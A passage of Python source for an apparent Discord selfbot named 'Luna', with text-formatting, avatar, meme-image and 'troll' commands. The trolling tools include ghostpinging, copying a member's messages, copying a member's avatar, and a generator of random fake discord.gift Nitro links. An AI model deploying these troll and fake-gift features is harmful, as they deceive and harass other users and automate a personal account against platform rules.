			.replace('y', 'ｙ').replace('Y', 'Ｙ').replace('z', 'ｚ').replace('Z', 'Ｚ')
		await luna.send(f'{text}')

	@commands.command(name = "zalgo",
					usage="<text>",
					description = "Zalgo text")
	async def zarlgo(self, luna, *, text:str):
		await luna.message.delete()
		await luna.send(zalgoText(text))

	@commands.command(name = "reverse",
					usage="<text>",
					description = "Reverse given text")
	async def reverse(luna, *, text):
		await luna.message.delete()
		text = text[::-1]
		await luna.send(text)

	@commands.command(name = "bold",
					usage="<text>",
					description = "Bold text format")
	async def bold(self, luna, *, text:str):
		await luna.message.delete()
		await luna.send(f"**{text}**")

	@commands.command(name = "spoiler",
					usage="<text>",
					description = "Spoiler text format")
	async def spoiler(self, luna, *, text:str):
		await luna.message.delete()
		await luna.send(f"||{text}||")

	@commands.command(name = "underline",
					usage="<text>",
					description = "Underline text format")
	async def underline(self, luna, *, text:str):
		await luna.message.delete()
		await luna.send(f"__{text}__")

	@commands.command(name = "strike",
					usage="<text>",
					description = "Strike text format")
	async def strike(self, luna, *, text:str):
		await luna.message.delete()
		await luna.send(f"~~{text}~~")

	@commands.command(name = "css",
					usage="<text>",
					description = "CSS text format")
	async def css(self, luna, *, text:str):
		await luna.message.delete()
		await luna.send(f"```css\n{text}\n```")
	
	@commands.command(name = "brainfuck",
					usage="<text>",
					description = "Brainfuck text format")
	async def brainfuck(self, luna, *, text:str):
		await luna.message.delete()
		await luna.send(f"```brainfuck\n{text}\n```")

	@commands.command(name = "md",
					usage="<text>",
					description = "MD text format")
	async def md(self, luna, *, text:str):
		await luna.message.delete()
		await luna.send(f"```md\n{text}\n```")

	@commands.command(name = "fix",
					usage="<text>",
					description = "Fix text format")
	async def fix(self, luna, *, text:str):
		await luna.message.delete()
		await luna.send(f"```fix\n{text}\n```")

	@commands.command(name = "glsl",
					usage="<text>",
					description = "Glsl text format")
	async def glsl(self, luna, *, text:str):
		await luna.message.delete()
		await luna.send(f"```glsl\n{text}\n```")

	@commands.command(name = "diff",
					usage="<text>",
					description = "Diff text format")
	async def diff(self, luna, *, text:str):
		await luna.message.delete()
		await luna.send(f"```diff\n{text}\n```")
		
	@commands.command(name = "bash",
					usage="<text>",
					description = "Bash text format")
	async def bash(self, luna, *, text:str):
		await luna.message.delete()
		await luna.send(f"```bash\n{text}\n```")
		
	@commands.command(name = "cs",
					usage="<text>",
					description = "CS text format")
	async def cs(self, luna, *, text:str):
		await luna.message.delete()
		await luna.send(f"```cs\n{text}\n```")

	@commands.command(name = "ini",
					usage="<text>",
					description = "Ini text format")
	async def ini(self, luna, *, text:str):
		await luna.message.delete()
		await luna.send(f"```ini\n{text}\n```")

	@commands.command(name = "asciidoc",
					usage="<text>",
					description = "Asciidoc text format")
	async def asciidoc(self, luna, *, text:str):
		await luna.message.delete()
		await luna.send(f"```asciidoc\n{text}\n```")

	@commands.command(name = "autohotkey",
					usage="<text>",
					description = "Autohotkey text format")
	async def autohotkey(self, luna, *, text:str):
		await luna.message.delete()
		await luna.send(f"```autohotkey\n{text}\n```")

bot.add_cog(TextCog(bot))
class ImageCog(commands.Cog, name="Image commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	# ///////////////////////////////////////////////////////////////
	# Avatar commands

	@commands.command(name = "avatar",
					usage="<@member>",
					aliases=["av"],
					description = "Send the avatar")
	async def av(self, luna, user_id=None):
		await luna.message.delete()
		if user_id == None:
			user = await self.bot.fetch_user(bot.user.id)
		elif "<@!" and ">" in user_id:
			user_id = user_id.replace("<@!", "").replace(">", "")
			user = await self.bot.fetch_user(user_id)
		else:
			user = await self.bot.fetch_user(user_id)
		embed = discord.Embed(title=f"{user}'s avatar", color=hexcolorvar())
		embed.set_image(url=user.avatar_url)
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		await send(luna, embed)

	@commands.command(name = "avatart",
					usage="<@member> <text>",
					asliases=["avt"],
					description = "Send the avatar")
	async def avatart(self, luna, member: discord.Member, *, text: str):
		await luna.message.delete()
		embed = discord.Embed(title=text,color=hexcolorvar())
		embed.set_image(url=member.avatar_url)
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		await send(luna, embed)

	@commands.command(name = "searchav",
					usage="<@member>",
					description = "Search link of the avatar")
	async def searchav(self, luna, member: discord.Member):
		await luna.message.delete()
		embed = discord.Embed(title=f"Search link for {member}'s avatar",description=f"https://images.google.com/searchbyimage?image_url={member.avatar_url}" ,color=hexcolorvar())
		embed.set_thumbnail(url=member.avatar_url)
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		await send(luna, embed)

	@commands.command(name = "linkav",
					usage="<@member>",
					description = "Link of the avatar")
	async def linkav(self, luna, member: discord.Member):
		await luna.message.delete()
		embed = discord.Embed(title=f"Link for {member}'s avatar",description=f"{member.avatar_url}" ,color=hexcolorvar())
		embed.set_thumbnail(url=member.avatar_url)
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		await send(luna, embed)

	@commands.command(name = "stealav",
					usage="<@member>",
					description = "Steal the avatar")
	async def stealav(self, luna, member: discord.Member):
		await luna.message.delete()
		url = member.avatar_url
		if password() == "password-here":
			printerror("You didnt put your password in the config.json file")
		else:
			password()
			with open('data/images/PFP-1.png', 'wb') as f:
				r = requests.get(url, stream=True)
				for block in r.iter_content(1024):
					if not block:
						break
					f.write(block)
		try:
			with open('data/images/PFP-1.png', 'rb') as f:
				await self.bot.user.edit(password=password(), avatar=f.read())
			embed = discord.Embed(description=f"```\nStole {member}'s avatar!```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)
		except discord.HTTPException as e:
			printerror(f"{e}")

	@commands.command(name = "setavatar",
					usage="<url>",
					description = "Set your avatar")
	async def setavatar(self, luna, url: str):
		await luna.message.delete()
		if password() == "password-here":
			printerror("You didnt put your password in the config.json file")
		else:
			password()
			with open('data/images/PFP-1.png', 'wb') as f:
				r = requests.get(url, stream=True)
				for block in r.iter_content(1024):
					if not block:
						break
					f.write(block)
		try:
			with open('data/images/PFP-1.png', 'rb') as f:
				await self.bot.user.edit(password=password(), avatar=f.read())
			embed = discord.Embed(description=f"```\nSet new avatar to »\n{url}```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)
		except discord.HTTPException as e:
			printerror(f"{e}")

	@commands.command(name = "invisav",
					usage="",
					description = "Invisible avatar")
	async def invisav(self, luna):
		await luna.message.delete()
		url = "https://gauginggadgets.com/wp-content/uploads/2020/07/InvisibleProfileImage.png"
		if password() == "password-here":
			printerror("You didnt put your password in the config.json file")
		else:
			password()
			with open('data/images/PFP-1.png', 'wb') as f:
				r = requests.get(url, stream=True)
				for block in r.iter_content(1024):
					if not block:
						break
					f.write(block)
		try:
			with open('data/images/PFP-1.png', 'rb') as f:
				await self.bot.user.edit(password=password(), avatar=f.read())
			embed = discord.Embed(description=f"```\nSet your avatar to invisible```" ,color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)
		except discord.HTTPException as e:
			printerror(f"{e}")

	# ///////////////////////////////////////////////////////////////
	# Fun image commands
        
	@commands.command(name = "dog",
					usage="",
					description = "Send a random dog")
	async def dog(self, luna):
		await luna.message.delete()
		r = requests.get("https://dog.ceo/api/breeds/image/random").json()
		embed = discord.Embed(title=titlevar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=str(r['message']))
		await send(luna, embed)

	@commands.command(name = "fox",
					usage="",
					description = "Send a random fox")
	async def fox(self, luna):
		await luna.message.delete()
		r = requests.get('https://randomfox.ca/floof/').json()
		embed = discord.Embed(title=titlevar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=str(r['image']))
		await send(luna, embed)
			
	@commands.command(name = "cat",
					usage="",
					description = "Send a random cat")
	async def cat(self, luna):
		await luna.message.delete()
		r = requests.get("https://api.thecatapi.com/v1/images/search").json()
		embed = discord.Embed(title=titlevar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=str(r[0]["url"]))
		await send(luna, embed)

	@commands.command(name = "sadcat",
					usage="",
					description = "Send a random sad cat")
	async def sadcat(self, luna):
		await luna.message.delete()
		r = requests.get("https://api.alexflipnote.dev/sadcat").json()
		embed = discord.Embed(title=titlevar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=str(r['file']))
		await send(luna, embed)

	@commands.command(name = "waifu",
					usage="",
					description = "Send a random waifu")
	async def waifu(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/waifu").json()
		embed = discord.Embed(title=titlevar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=str(r['url']))
		await send(luna, embed)

	# ///////////////////////////////////////////////////////////////
	# Image commands

	@commands.command(name = "wallpaper",
					usage="",
					description = "Send a random anime wallpaper")
	async def wallpaper(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/wallpaper").json()
		embed = discord.Embed(title=titlevar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=str(r['url']))
		await send(luna, embed)
	
	@commands.command(name = "wide",
					usage="<@member>",
					description = "Wide profile picture")
	async def wide(self, luna, user: discord.User):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f"https://vacefron.nl/api/wide?image={urllib.parse.quote(str(user.avatar_url).replace('webp', 'png'))}")
		await send(luna, embed)

	@commands.command(name = "trumptweet",
					usage="<text>",
					description = "Create a Trump tweet")
	async def trumptweet(self, luna, *, text:str):
		await luna.message.delete()
		request = requests.get(f'https://nekobot.xyz/api/imagegen?type=trumptweet&text={urllib.parse.quote(text)}')
		data = request.json()
		link = data['message']
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=link)
		await send(luna, embed)

	@commands.command(name = "bidentweet",
					usage="<text>",
					description = "Create a Biden tweet")
	async def bidentweet(self, luna, *, text:str):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f'https://api.popcatdev.repl.co/biden?text={str(urllib.parse.quote(text))}')
		await send(luna, embed)

	@commands.command(name = "tweet",
					usage="<name> <text>",
					description = "Create a tweet")
	async def tweet(self, luna, name, *, text:str):
		await luna.message.delete()
		request = requests.get(f'https://nekobot.xyz/api/imagegen?type=tweet&username={name}&text={urllib.parse.quote(text)}')
		data = request.json()
		link = data['message']
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=link)
		await send(luna, embed)

	@commands.command(name = "supreme",
					usage="<text>",
					description = "Custom supreme logo")
	async def supreme(self, luna, *, text:str):
		await luna.message.delete()
		request = requests.get(f'https://react.flawcra.cc/api/generation.php?type=supreme&text={str(urllib.parse.quote(text))}').json()['url']
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f'{request}')
		await send(luna, embed)

	@commands.command(name = "changemymind",
					usage="<text>",
					description = "Changemymind meme")
	async def changemymind(self, luna, *, text:str):
		await luna.message.delete()
		request = requests.get(f'https://nekobot.xyz/api/imagegen?type=changemymind&text={urllib.parse.quote(text)}')
		data = request.json()
		link = data['message']
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=link)
		await send(luna, embed)

	@commands.command(name = "phcomment",
					aliases=['pornhubcomment'],
					usage="<@member> <text>",
					description = "Pornhub comment")
	async def phcomment(self, luna, user: discord.User, *, text: str):
		await luna.message.delete()
		image_url = str(user.avatar_url).replace(".webp", ".png")
		request = requests.get(f'https://nekobot.xyz/api/imagegen?type=phcomment&image={image_url}&username={urllib.parse.quote(user.name)}&text={urllib.parse.quote(text)}')
		data = request.json()
		link = data['message']
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=link)
		await send(luna, embed)

	@commands.command(name = "clyde",
					usage="<text>",
					description = "Custom Clyde message")
	async def clyde(self, luna, *, text:str):
		await luna.message.delete()
		request = requests.get(f'https://nekobot.xyz/api/imagegen?type=clyde&text={urllib.parse.quote(text)}')
		data = request.json()
		link = data['message']
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=link)
		await send(luna, embed)

	@commands.command(name = "pikachu",
					usage="<text>",
					description = "Surprised Pikachu")
	async def pikachu(self, luna, *, text:str):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f"https://api.popcatdev.repl.co/pikachu?text={urllib.parse.quote(str(text))}")
		await send(luna, embed)

	@commands.command(name = "stonks",
					usage="<@member>",
					description = "Stonks!")
	async def stonks(self, luna, user: discord.User):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f"https://vacefron.nl/api/stonks?user={urllib.parse.quote(str(user.avatar_url).replace('webp', 'png'))}")
		await send(luna, embed)

	@commands.command(name = "notstonks",
					usage="<@member>",
					description = "Notstonks!")
	async def notstonks(self, luna, user: discord.User):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f"https://vacefron.nl/api/stonks?user={urllib.parse.quote(str(user.avatar_url).replace('webp', 'png'))}&notstonks=true")
		await send(luna, embed)

	@commands.command(name = "emergencymeeting",
					usage="<text>",
					description = "Emergency meeting!")
	async def emergencymeeting(self, luna, *, text):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f"https://vacefron.nl/api/emergencymeeting?text={urllib.parse.quote(text)}")
		await send(luna, embed)

	@commands.command(name = "eject",
					usage="<true/false> <color> <@member>",
					description = "Among Us")
	async def eject(self, luna, impostor: bool, crewmate: str, user: discord.User):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f"https://vacefron.nl/api/ejected?name={urllib.parse.quote(user.name)}&impostor={impostor}&crewmate={crewmate}")
		await send(luna, embed)

	@commands.command(name = "drip",
					usage="<@member>",
					description = "Drip meme")
	async def drip(self, luna, user: discord.User):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f"https://vacefron.nl/api/drip?user={urllib.parse.quote(str(user.avatar_url).replace('webp', 'png'))}")
		await send(luna, embed)

	@commands.command(name = "gun",
					usage="<@member>",
					description = "Gun meme")
	async def gun(self, luna, user: discord.User):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f"https://api.popcatdev.repl.co/gun?image={urllib.parse.quote(str(user.avatar_url).replace('webp', 'png'))}")
		await send(luna, embed)

	@commands.command(name = "ad",
					usage="<@member>",
					description = "Make yourself an ad")
	async def ad(self, luna, user: discord.User):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f"https://api.popcatdev.repl.co/ad?image={urllib.parse.quote(str(user.avatar_url).replace('webp', 'png'))}")
		await send(luna, embed)

	@commands.command(name = "alert",
					usage="<text>",
					description = "Iphone alert")
	async def alert(self, luna, *, text:str):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f"https://api.popcatdev.repl.co/alert?text={urllib.parse.quote(str(text))}")
		await send(luna, embed)

	@commands.command(name = "caution",
					usage="<text>",
					description = "Caution image")
	async def caution(self, luna, *, text:str):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f"https://api.popcatdev.repl.co/caution?text={urllib.parse.quote(str(text))}")
		await send(luna, embed)

	@commands.command(name = "distractedbf",
					usage="<@boyfriend> <@woman> <@girlfriend>",
					description = "Distracted boyfriend meme")
	async def distractedbf(self, luna, boyfriend: discord.User, woman: discord.User, girlfriend: discord.User):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f"https://vacefron.nl/api/distractedbf?boyfriend={urllib.parse.quote(str(boyfriend.avatar_url).replace('webp', 'png'))}&woman={urllib.parse.quote(str(woman.avatar_url).replace('webp', 'png'))}&girlfriend={urllib.parse.quote(str(girlfriend.avatar_url).replace('webp', 'png'))}")
		await send(luna, embed)

	@commands.command(name = "icanmilkyou",
					usage="<@member1> <@member2>",
					description = "ICanMilkYou")
	async def icanmilkyou(self, luna, user1: discord.User, user2: discord.User):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f"https://vacefron.nl/api/icanmilkyou?user1={urllib.parse.quote(str(user1.avatar_url).replace('webp', 'png'))}&user2={urllib.parse.quote(str(user2.avatar_url).replace('webp', 'png'))}")
		await send(luna, embed)

	@commands.command(name = "heaven",
					usage="<@member>",
					description = "Heaven meme")
	async def heaven(self, luna, user: discord.User):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f"https://vacefron.nl/api/heaven?user={urllib.parse.quote(str(user.avatar_url).replace('webp', 'png'))}")
		await send(luna, embed)

	@commands.command(name = "dockofshame",
					usage="<@member>",
					description = "Heaven meme")
	async def dockofshame(self, luna, user: discord.User):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f"https://vacefron.nl/api/dockofshame?user={urllib.parse.quote(str(user.avatar_url).replace('webp', 'png'))}")
		await send(luna, embed)

	@commands.command(name = "firsttime",
					usage="<@member>",
					description = "First time? meme")
	async def firsttime(self, luna, user: discord.User):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f"https://vacefron.nl/api/firsttime?user={urllib.parse.quote(str(user.avatar_url).replace('webp', 'png'))}")
		await send(luna, embed)

	@commands.command(name = "trash",
					usage="<@member>",
					description = "Trash meme")
	async def trash(self, luna, user: discord.User):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f'https://api.no-api-key.com/api/v2/trash?image={str(user.avatar_url).replace(".webp", ".png")}')
		await send(luna, embed)

	@commands.command(name = "simp",
					usage="<@member>",
					description = "Simp card")
	async def simp(self, luna, user: discord.User):
		await luna.message.delete()
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f'https://api.no-api-key.com/api/v2/simpcard?image={str(user.avatar_url).replace(".webp", ".png")}')
		await send(luna, embed)

	@commands.command(name = "wanted",
					usage="<@member>",
					description = "Wanted")
	async def wanted(self, luna, user: discord.User):
		await luna.message.delete()
		request = requests.get(f'https://react.flawcra.cc/api/generation.php?type=wanted&url={str(user.avatar_url).replace(".webp", ".png")}')
		data = request.json()
		link = data['url']
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=link)
		await send(luna, embed)

	@commands.command(name = "wasted",
					usage="<@member>",
					description = "GTA Wasted")
	async def wasted(self, luna, user: discord.User):
		await luna.message.delete()
		request = requests.get(f'https://react.flawcra.cc/api/generation.php?type=wasted&url={str(user.avatar_url).replace(".webp", ".png")}')
		data = request.json()
		link = data['url']
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=link)
		await send(luna, embed)

	@commands.command(name = "continued",
					usage="<@member>",
					description = "To be continued")
	async def continued(self, luna, user: discord.User):
		await luna.message.delete()
		request = requests.get(f'https://react.flawcra.cc/api/generation.php?type=tobecontinued&url={str(user.avatar_url).replace(".webp", ".png")}')
		data = request.json()
		link = data['url']
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=link)
		await send(luna, embed)

	@commands.command(name = "drake",
					usage="<no, yes>",
					description = "Drake yes and no meme")
	async def drake(self, luna, *, text:str):
		await luna.message.delete()
		text = text.split(', ')
		text1 = text[0]
		text2 = text[1]
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f'https://api.popcatdev.repl.co/drake?text1={str(urllib.parse.quote(text1))}&text2={str(urllib.parse.quote(text2))}')
		await send(luna, embed)

	@commands.command(name = "takemymoney",
					usage="<text1, text2>",
					description = "Take my money")
	async def takemymoney(self, luna, *, text:str):
		await luna.message.delete()
		text = text.split(', ')
		text1 = text[0]
		text2 = text[1]
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=f"https://api.memegen.link/images/money/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png")
		await send(luna, embed)

	@commands.command(name = "pornhub",
					usage="<text1, text2>",
					description = "PornHub logo")
	async def pornhub(self, luna, *, text:str):
		await luna.message.delete()
		text = text.split(', ')
		text1 = text[0]
		text2 = text[1]
		request = requests.get(f'https://react.flawcra.cc/api/generation.php?type=phlogo&text={str(urllib.parse.quote(text1))}&text2={str(urllib.parse.quote(text2))}')
		data = request.json()
		link = data['url']
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=link)
		await send(luna, embed)

	@commands.command(name = "recaptcha",
					usage="<text>",
					description = "reCAPTCHA")
	async def recaptcha(self, luna, *, text:str):
		await luna.message.delete()
		request = requests.get(f'https://react.flawcra.cc/api/generation.php?type=captcha&text={str(urllib.parse.quote(text))}')
		data = request.json()
		link = data['url']
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), color=hexcolorvar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=link)
		await send(luna, embed)

bot.add_cog(ImageCog(bot))
def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'
class TrollCog(commands.Cog, name="Troll commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "ghostping",
					usage="<@member>",
					aliases=['gp'],
					description = "Ghostping someone")
	async def ghostping(self, luna):
		await luna.message.delete()
        
	@commands.command(name = "empty",
					usage="",
					description = "Sends a empty message")
	async def empty(self, luna):
		await luna.message.delete()
		await luna.send("​")

	@commands.command(name = "copy",
					usage="<@member>",
					aliases=['copycat'],
					description = "Copy every message a member")
	async def copy(self, luna, member:discord.User):
		await luna.message.delete()
		global copycat
		copycat = member
		if mode() == 2:
			sent = await luna.send(f"```ini\n[ {titlevar()} ]\n\nNow copying {copycat}\n\n[ {footervar()} ]```")
			await asyncio.sleep(deletetimer())
			await sent.delete()
		else:
			embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"Now copying {copycat}", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			sent = await luna.send(embed=embed)
			await asyncio.sleep(deletetimer())
			await sent.delete()

	@commands.command(name = "stopcopy",
					usage="",
					aliases=['stopcopycat'],
					description = "Copy every message a member")
	async def stopcopy(self, luna):
		await luna.message.delete()
		global copycat
		if copycat is None:
			if mode() == 2:
				sent = await luna.send(f"```ini\n[ {titlevar()} ]\n\nNo one was getting copied\n\n[ {footervar()} ]```")
				await asyncio.sleep(deletetimer())
				await sent.delete()
			else:
